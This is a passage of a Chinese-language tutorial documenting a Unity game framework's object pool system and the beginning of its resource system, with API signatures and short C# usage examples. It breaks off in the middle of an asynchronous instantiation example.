<li>
<p>对象池系统：重复利用GameObject或普通class实例，并且支持设置对象池容量</p>
</li>
<li>
<p>事件系统：解耦工具，不需要持有引用来进行函数的调用</p>
</li>
<li>
<p>资源系统</p>
<ul>
<li>Resources版本：关联对象池进行资源的加载卸载</li>
<li>Addressables版本：关联对象池进行资源的加载卸载，可结合事件工具做到销毁时自动从Addressables Unload</li>
</ul>
</li>
<li>
<p>MonoSystem：为不继承MonoBehaviour的对象提供Update、FixedUpdate、协程等功能</p>
</li>
<li>
<p>音效系统：背景音乐、背景音乐轮播、特效音乐、音量全局控制等</p>
</li>
<li>
<p>存档系统：</p>
<ul>
<li>支持多存档</li>
<li>自动缓存，避免频繁读磁盘</li>
<li>存玩家设置类数据，也就是不关联任何一个存档</li>
<li>支持二进制和Json存档，开发时使用Json调试，上线后使用二进制加密与减少文件体积</li>
</ul>
</li>
<li>
<p>日志系统：日志控制、保存等</p>
</li>
<li>
<p>UI系统：UI窗口的层级管理、Tips功能</p>
</li>
<li>
<p>场景系统：对Unity场景加载封装了一层，主要用于监听场景加载进度</p>
</li>
<li>
<p>本地化系统：分为全局配置和局部配置（随GameObject加载）、UI自动本地化收集器（Text、Image组件无需代码即可自动本地化）</p>
</li>
</ol>
<p>其他功能：</p>
<ol start="0">
<li>状态机：脚本逻辑状态机。</li>
<li>事件工具： 给物体添加点击、鼠标进入、鼠标拖拽、碰撞、触发、销毁等事件，而不需要额外在该物体上添加脚本等。</li>
<li>协程工具：协程避免GC。</li>
</ol>
<h2 data-id="heading-1">对象池</h2>
<p>在Unity中，对象的生成、销毁都需要性能开销，在一些特定的应用场景下需要进行大量重复物体的克隆，因此需要通过设计对象池来实现重复利用对象实例，减少触发垃圾回收。常用在频繁创建、销毁对象的情况下，比如子弹、AI生成等等、背包格子。</p>
<p>本框架的对象池系统有两类对象池（GameObject对象池和Object对象池）分别负责对需要在场景中实际激活/隐藏的GameObject和不需要显示在场景里的对象（脚本类、材质资源）进行管理。</p>
<p>本框架提供对象池容量的限制，且初始化时，可以预先传入要放入的对象根据默认容量实例化放入对象池，比如场景中默认使用20发子弹，可以在对象池初始化时就实例化好20枚子弹放入对象池。</p>
<p>如有特殊需求，可以通过持有PoolMoudle层来单独构建一个不同于全局对象池PoolSystem的Pool，默认正常情况下使用全局对象池PoolSystem即可。</p>
<h3 data-id="heading-2">GameObject对象池（GOP）</h3>
<p>用于管理实际存在场景中并出现在Hierarchy窗口上的GameObject对象。</p>
<h4 data-id="heading-3">初始化GOP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1,GameObject prefab = null,int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, prefab, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName);
<span class="hljs-comment">//根据prefab.name初始化GOP</span>
<span class="hljs-comment">//  //(GameObject prefab = null, int maxCapacity = -1,GameObject prefab = null,int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab, maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab);
<span class="hljs-comment">//根据GameObject数组大小进行默认容量设置，并将数组对象作为默认对象全部置入对象池</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, GameObject[] gameObjects = null)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, gameObject);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池，最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入prefab根据prefab.name 指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>初始化并不向构建出的空对象池填入内容，但可通过prefab和defaultQuanity设置默认容量填充空对象池（初始化时会自动按默认容量和最大容量的最小值自动生成GameObject放入对象池）。</li>
<li>可通过传入GameObject数组初始化对象池的默认容量并放入对象填充空对象池。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
</ul>
<h4 data-id="heading-4">将对象放入GOP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName/obj.name放入对象池</span>
<span class="hljs-comment">//(string assetName, GameObject obj)</span>
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>(keyName, obj);
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>(obj);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//将一个子弹对象bullet放入Bullet对象池</span>
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>("Bullet", bullet);


<span class="hljs-comment">// 扩展方法</span>
bullet<span class="hljs-selector-class">.GameObjectPushPool</span>();
</code></pre>
<ul>
<li>通过keyName指定对象池名字放入对象obj，keyName不填则默认对象池名字为obj.name。</li>
<li>封装了拓展方法，可以通过对象.GameObjectPushPool()简便地将GameObject放入对象池。</li>
</ul>

<ul>
<li>可以使用拓展方法直接将对象放入同名对象池内。</li>
<li>如果传入的keyName/prefab找不到对应的对象池（未Init），则会直接初始化生成一个同名的，无限容量的对象池并放入本次对象。</li>
<li>obj为null时本次放入操作无效，会进行报错提示。</li>
</ul>
<h4 data-id="heading-5">将对象从GOP中取出</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName加载GameObject</span>
<span class="hljs-comment">//(string keyName, Transform parent)</span>
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>(keyName, parent);
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>(keyName);
<span class="hljs-comment">//根据keyName和T加载GameObject并获取组件，返回值类型为T</span>
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>&lt;T&gt;(keyName, parent);
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>&lt;T&gt;(keyName);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//将一个子弹对象从对象池中取出</span>
GameObject bullet = PoolSystem<span class="hljs-selector-class">.GetGameObject</span>("Bullet");
<span class="hljs-comment">//将一个子弹对象从对象池中取出并获取其刚体组件</span>
GameObject bullet = PoolSystem<span class="hljs-selector-class">.GetGameOjbect</span>&lt;Rigidbody&gt;("Bullet");
</code></pre>
<ul>
<li>通过keyName指定对象池名字取出GameObject对象并设置父物体为parent，parent不填则默认无父物体在最顶层。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
</ul>

<ul>
<li>当某个对象池内无对象时，其对象池仍会被保存，只有通过Clear才能彻底清空对象池。</li>
<li>当对象池中无对象仍要取出时，会返回null。</li>
</ul>
<h4 data-id="heading-6">清空GOP对象池</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//清空（GameObject/Object）对象池</span>
<span class="hljs-comment">//(bool clearGameObject = true, bool clearCSharpObject = true)</span>
PoolSystem.<span class="hljs-built_in">ClearAll</span>(<span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
<span class="hljs-comment">//清空GameObject类对象池中keyName索引的对象池</span>
<span class="hljs-comment">//(string assetName)</span>
PoolSystem.<span class="hljs-built_in">ClearGameObject</span>(keyName);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//清空所有GOP对象池</span>
PoolSystem.<span class="hljs-built_in">ClearAll</span>(<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>);
<span class="hljs-comment">//清空Bullet对象池</span>
PoolSystem.<span class="hljs-built_in">ClearGameObject</span>(<span class="hljs-string">"Bullet"</span>);
</code></pre>
<ul>
<li>ClearAll方法用于清空所有GOP/OP对象池，两个bool参数是否清空GOP、是否清空OP。</li>
<li>清空某一类GOP通过传入keyName对象池名索引。</li>
</ul>

<ul>
<li>清空所有对象池时（ClearAll），所有资源都会被释放。</li>
<li>清空某一类对象池时,GameObject中的数据载体和根节点会被放回对象池重复利用（使用时无需关心，底层实现）。</li>
</ul>
<h3 data-id="heading-7">Object对象池（OP）</h3>
<p>用于管理脚本类对象等非游戏物体对象，OP的API和GOP类似，只不过在传参部分OP支持更多方式</p>
<h4 data-id="heading-8">初始化OP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>); <span class="hljs-comment">//对象池名为myData</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">//对象池池名为Data</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType()); <span class="hljs-comment">//对象池名为xx的类型名</span>
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字，优先使用keyName，在没有keyName的情况下以T类型名作为对象池名称。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成Object放入对象池），对应GameObject通过prefab和defaultQuanity设置默认容量。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>OP的初始化和GOP略有不同，使用了泛型T传递类型，参数列表更加精简，但只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h4 data-id="heading-9">将对象放入OP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName/obj.getType().FullName即obj对应的类型名放入对象池</span>
<span class="hljs-comment">//(object obj, string keyName)</span>
PoolSystem<span class="hljs-selector-class">.PushObject</span>(obj, keyName);
PoolSystem<span class="hljs-selector-class">.PushObject</span>(obj);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//将一个Data数据类对象data放入Data对象池</span>
PoolSystem<span class="hljs-selector-class">.PushObject</span>(data, "Data";
PoolSystem.PushObject(data);


<span class="hljs-comment">// 扩展方法</span>
bullet<span class="hljs-selector-class">.ObjectPushPool</span>();
</code></pre>
<ul>
<li>通过keyName指定对象池名字放入对象obj，keyName不填则默认对象池名字为obj.name。</li>
<li>封装了拓展方法，可以通过对象.GameObjectPushPool()简便地将GameObject放入对象池。</li>
<li>可以使用拓展方法直接将对象放入同名对象池内。</li>
<li>如果传入的keyName/obj找不到对应的对象池（未Init），则会直接初始化生成一个同名的，无限容量的对象池并放入本次对象。</li>
<li>obj为null时本次放入操作无效,会进行报错提示。</li>
</ul>
<h4 data-id="heading-10">将对象从OP中取出</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName返回System.object类型对象</span>
<span class="hljs-comment">//(string keyName)</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>(keyName);
<span class="hljs-comment">//根据keyName返回T类型的对象</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T类型名称返回对象</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;T&gt;();
<span class="hljs-comment">//根据type类型名返回对象</span>
<span class="hljs-comment">//(System.Type type)</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>(xx.getType());




<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//将一个Data数据类对象data从对象池中取出</span>
Data data = PoolSystem<span class="hljs-selector-class">.GetObject</span>("Data");
Data data = PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;Data&gt;();
</code></pre>
<ul>
<li>通过keyName，泛型T，type类型指定对象池名字取出Object对象。</li>
<li>优先根据keyName索引，不存在keyName时，则通过泛型T的反射类型和type类型名索引</li>
</ul>

<ul>
<li>推荐使用泛型方法，否则返回值是object类型还需要手动进行转换。</li>
</ul>
<h4 data-id="heading-11">清空OP对象池</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//清空（GameObject/Object）对象池</span>
<span class="hljs-comment">//(bool clearGameObject = true, bool clearCSharpObject = true)</span>
PoolSystem<span class="hljs-selector-class">.ClearAll</span>(false, true);
<span class="hljs-comment">//清空Object类对象池下keyName/T类型名/type类型名对象池</span>
<span class="hljs-comment">//(string keyName)</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>(keyName);
PoolSystem<span class="hljs-selector-class">.ClearObject</span>&lt;T&gt;();
<span class="hljs-comment">//(System.Type type)</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>(xx.getType());


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//清空所有OP对象池</span>
PoolSystem<span class="hljs-selector-class">.ClearAll</span>(false,true);
<span class="hljs-comment">//清空Data对象池</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>("Data");
PoolSystem<span class="hljs-selector-class">.ClearObject</span>&lt;Data&gt;();
</code></pre>
<ul>
<li>ClearAll方法用于清空所有GOP/OP对象池，两个bool参数是否清空GOP、是否清空OP。</li>
<li>清空某一类OP通过传入keyName/泛型T的反射类型名/type类型名索引。</li>
</ul>

<ul>
<li>清空所有对象池时（ClearAll），所有资源都会被释放。</li>
<li>清空某一类对象池时,Object中的数据载体会被放回对象池重复利用（使用时无需关心，底层实现）。</li>
</ul>
<h3 data-id="heading-12">对象池可视化</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1bd578e2ace4f2caa8168991bff5f07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=MI1i3WXu02d4bjEqZ8Vnmki5%2F%2F4%3D" alt="alt" loading="lazy"/>​</p>
<p>可以通过PoolSystemViewer观察OP和GOP。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbc55580ce2042dcb64e6b9962e57205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=vlRib8HjvMJGorzzS6eUgGeGK5k%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-13">注意</h3>
<ul>
<li>对象池的名字可以和放入的对象名字不同，并且每一个放入对象池的对象名词也可以不同（只要类型一致），但为了避免混淆，我们推荐同名（同类名或者同GameObject名）或者使用配置、枚举来记录对象池名。</li>
<li>PoolSystem可以直接使用，但大多情况下，推荐使用ResSystem来获取GameObject/Object对象来保证返回值不为null。</li>
</ul>
<h2 data-id="heading-14">资源系统</h2>
<p>资源系统实现了Unity资源、游戏对象、类对象的获取、异步加载，并在加载游戏对象和类对象资源时优先从对象池中获取资源来优化性能，若对象池不存在对应资源再通过资源加载方法进行实例化（因为在直接使用对象池时，返回值允许为null，但）。提供Resources和Addressables两种版本:</p>
<ul>
<li>Resources版本，关联对象池进行资源的加载、卸载。</li>
<li>Addressables版本，除关联对象池进行资源的加载、卸载外，结合事件工具实现对象Destroy时Adressables自动unload。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5b2be94089408ab014b0b065ede8b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=80JL9YOMV6T2WzZc6vbDbixOZoo%3D" alt="alt" loading="lazy"/>​</p>
<p>两种版本在框架设置里进行切换，。</p>
<h3 data-id="heading-15">Resources版本</h3>
<h4 data-id="heading-16">普通类对象(obj)</h4>
<p>类对象资源不涉及异步加载、Resources和Addressables的区别，直接走对象池系统。</p>
<h5 data-id="heading-17">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem一致。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType());
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成T类型的对象放入对象池）。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h5 data-id="heading-18">obj加载</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-comment">//string keyName</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;(keyName);
<span class="hljs-comment">//根据T类型名从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;();


<span class="hljs-comment">//简单示例,获取Data数据类的一个对象</span>
<span class="hljs-type">GameObject</span> go1 <span class="hljs-operator">=</span> <span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">Data</span>&gt;(<span class="hljs-string">"Data"</span>);
</code></pre>
<ul>
<li>通过keyName指定加载的类对象名，不填keyName则按照T的类型名加载。</li>
</ul>

<ul>
<li>加载时优先通过对象池获取，如果对象池中无对应资源，自动new一个类对象返回，保证返回值不为null,这点体现了资源系统比对象池更完善，对象池get不存在的obj资源返回Null。</li>
</ul>
<h5 data-id="heading-19">obj卸载</h5>
<p>卸载obj即将obj放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/obj类型名将obj放回对象池</span>
<span class="hljs-comment">//object obj, string keyName</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj);
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj, string keyName);


<span class="hljs-comment">//简单示例，卸载Data类的对象data</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(data, "Data");
</code></pre>
<ul>
<li>通过obj指定卸载的对象，keyName指定对象池名，不填则按照obj的类型名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将obj放入，保证对象卸载成功,这点体现了资源系统比对象池更完善，对象池push未初始化的对象池资源会报错。</li>
</ul>
<h4 data-id="heading-20">游戏对象（GameObject）</h4>
<h5 data-id="heading-21">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem大体一致，在prefab部分传参略有不同，通过传Resources下对应的路径由资源系统获得预制体，并克隆出来放入对象池。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, string assetPath = null, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, assetPath, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName);
<span class="hljs-comment">//根据assetPath切割的资源名初始化GOP</span>
<span class="hljs-comment">//(string assetPath, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath, maxCapacity, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池（假设Bullet的路径在Resources文件夹下），最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入assetPath(完整资源路径)根据切割的资源名指定对象池的名字。</li>
<li>传入的assetPath会自动切割获得资源名。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过assetPath获取的资源和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成GameObject放入对象池）。</li>
<li>默认无限容量maxCapacity = -1，不预先放入对象，assetPath = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>注意加载到内存的对象在被实例化之后会被自动释放。</li>
</ul>
<h5 data-id="heading-22">GameObject加载并实例化</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//加载游戏物体
//(string assetPath, Transform <span class="hljs-attr">parent</span> = null,string keyName=null)
ResSystem.InstantiateGameObject(assetPath, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetPath, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetPath)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName)<span class="hljs-comment">;</span>
//加载游戏物体并获取组件T
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体
//(string path, Action&lt;GameObject&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null)
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体并获取组件T
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath)<span class="hljs-comment">;</span>


//简单示例
//实例化一个子弹对象（假设Bullet路径在Resources下）
GameObject <span class="hljs-attr">bullet</span> = ResSystem.InstantiateGameObject(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//实例化一个子弹对象取出并获取其刚体组件
Rigidbody <span class="hljs-attr">rb</span> = ResSystem.InstantiateGameObject&lt;Rigidbody&gt;(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//异步实例化一个子弹对象,并在其加载完后坐标归零
void getBullet(GameObject bullet)
{
    <span class="hljs-attr">bullet.transform.position</span> = Vector3.zero<span class="hljs-comment">;</span>
    }
